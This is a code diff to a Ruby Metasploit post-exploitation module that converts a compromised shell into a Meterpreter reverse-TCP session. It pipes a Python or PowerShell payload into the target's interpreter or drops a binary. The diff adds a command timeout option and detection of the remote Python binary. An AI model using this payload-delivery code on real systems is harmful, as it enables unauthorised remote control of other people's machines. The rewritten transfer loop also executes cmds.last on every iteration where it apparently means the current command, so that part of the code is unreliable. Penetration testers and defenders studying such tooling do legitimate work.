@@ -45,9 +45,15 @@ class MetasploitModule < Msf::Post
       OptString.new('BOURNE_PATH',
                     [false, 'Remote path to drop binary']),
       OptString.new('BOURNE_FILE',
-                    [false, 'Remote filename to use for dropped binary'])
+                    [false, 'Remote filename to use for dropped binary']),
+      OptInt.new('COMMAND_TIMEOUT',
+                 [true, 'How long to wait (in seconds) for a result when executing a command on the remote machine.', 15]),
     ])
     deregister_options('PERSIST', 'PSH_OLD_METHOD', 'RUN_WOW64')
+  end
+
+  def command_timeout
+    datastore['COMMAND_TIMEOUT']
   end
 
   # Run method for when run command is issued
@@ -118,7 +124,7 @@ class MetasploitModule < Msf::Post
         lplat = [Msf::Platform::OSX]
         larch = [ARCH_X64]
         vprint_status('Platform: OS X')
-      elsif cmd_exec('python -V 2>&1') =~ /Python (2|3)\.(\d)/
+      elsif remote_python_binary
         # Generic fallback for OSX, Solaris, Linux/ARM
         platform = 'python'
         payload_name = 'python/meterpreter/reverse_tcp'
@@ -176,7 +182,7 @@ class MetasploitModule < Msf::Post
           cmd_exec("echo. | #{cmd_psh_payload(payload_data, psh_arch, psh_opts)}")
         else
           psh_opts[:remove_comspec] = true
-          cmd_exec(cmd_psh_payload(payload_data, psh_arch, psh_opts), nil, 15, { 'Channelized' => false })
+          cmd_exec(cmd_psh_payload(payload_data, psh_arch, psh_opts), nil, command_timeout, { 'Channelized' => false })
         end
       else
         print_error('Powershell is not installed on the target.') if datastore['WIN_TRANSFER'] == 'POWERSHELL'
@@ -186,11 +192,11 @@ class MetasploitModule < Msf::Post
       end
     when 'python'
       vprint_status('Transfer method: Python')
-      cmd_exec("echo \"#{payload_data}\" | python")
+      cmd_exec("echo \"#{payload_data}\" | #{remote_python_binary}", nil, command_timeout, { 'Channelized' => false })
     when 'osx'
       vprint_status('Transfer method: Python [OSX]')
       payload_data = Msf::Util::EXE.to_python_reflection(framework, ARCH_X64, payload_data, {})
-      cmd_exec("echo \"#{payload_data}\" | python & disown")
+      cmd_exec("echo \"#{payload_data}\" | #{remote_python_binary} & disown", nil, command_timeout, { 'Channelized' => false })
     else
       vprint_status('Transfer method: Bourne shell [fallback]')
       exe = Msf::Util::EXE.to_executable(framework, larch, lplat, payload_data)
@@ -202,6 +208,29 @@ class MetasploitModule < Msf::Post
       cleanup_handler(listener_job_id, aborted)
     end
     return nil
+  end
+
+  #
+  # Get the Python binary from the remote machine, if any, by running
+  # a series of channelized `cmd_exec` calls.
+  # @return String/nil A string if a Python binary can be found, else nil.
+  #
+  def remote_python_binary
+    return @remote_python_binary if defined?(@remote_python_binary)
+
+    python_exists_regex = /Python (2|3)\.(\d)/
+
+    if cmd_exec('python3 -V 2>&1') =~ python_exists_regex
+      @remote_python_binary = 'python3'
+    elsif cmd_exec('python -V 2>&1') =~ python_exists_regex
+      @remote_python_binary = 'python'
+    elsif cmd_exec('python2 -V 2>&1') =~ python_exists_regex
+      @remote_python_binary = 'python2'
+    else
+      @remote_python_binary = nil
+    end
+
+    @remote_python_binary
   end
 
   def transmit_payload(exe, platform)
@@ -249,22 +278,27 @@ class MetasploitModule < Msf::Post
       #
       sent = 0
       aborted = false
-      cmds.each do |cmd|
-        ret = cmd_exec(cmd)
-        if !ret
-          aborted = true
-        else
-          ret.strip!
-          aborted = true if !ret.empty? && ret !~ /The process tried to write to a nonexistent pipe./
-        end
-        if aborted
-          print_error('Error: Unable to execute the following command: ' + cmd.inspect)
-          print_error('Output: ' + ret.inspect) if ret && !ret.empty?
-          break
+      cmds.each.with_index do |cmd, i|
+        # The last command should be fire-and-forget, otherwise issues occur where the original session waits
+        # for an unlimited amount of time for the newly spawned session to exit.
+        wait_for_cmd_result = i + 1 < cmds.length
+        # Note that non-channelized cmd_exec calls currently return an empty string
+        ret = cmd_exec(cmds.last, nil, command_timeout, { 'Channelized' => wait_for_cmd_result })
+        if wait_for_cmd_result
+          if !ret
+            aborted = true
+          else
+            ret.strip!
+            aborted = true if !ret.empty? && ret !~ /The process tried to write to a nonexistent pipe./
+          end
+          if aborted
+            print_error('Error: Unable to execute the following command: ' + cmd.inspect)
+            print_error('Output: ' + ret.inspect) if ret && !ret.empty?
+            break
+          end
         end
 
         sent += cmd.length
-
         progress(total_bytes, sent)
       end
     rescue ::Interrupt
